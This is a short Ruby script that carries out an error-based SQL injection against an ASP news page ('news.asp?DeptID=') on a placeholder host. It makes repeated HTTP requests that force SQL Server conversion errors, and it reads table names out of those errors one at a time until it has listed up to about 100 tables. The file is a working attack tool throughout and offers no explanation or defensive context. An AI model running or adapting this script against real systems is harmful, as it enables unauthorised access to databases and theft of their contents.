# encoding: UTF-8
require 'net/http'
require 'uri'


dbname = 'mydb'

$host = 'www.target.com'
$path = URI::encode "/news.asp?DeptID=02';if (select top 1 name from #{dbname}..sysobjects where xtype='U')>0 select 1 --"
$p1 = "/news.asp?DeptID=02';if (select top 1 name from #{dbname}..sysobjects where xtype='U'"
$p2 = " and name not in ("
$p3 = "))>0 select 1--"
$key = ""

res = Net::HTTP.get_response($host, $path)

/varchar value '(.*)' to data type int/ =~ res.body
now = Regexp.last_match[1].strip
puts now

flag = 1

(1..100).each do
    if flag == 0
        $key = $key + ", '" + now + "'"
    else
        flag = 0
        $key = $key + "'" + now + "'"
    end
    
    $path = URI::encode($p1 + $p2 + $key + $p3)
    res = Net::HTTP.get_response($host, $path)
    /varchar value '(.*)' to data type int/ =~ res.body
    now = Regexp.last_match[1].strip
    puts now
    sleep 0.1
end
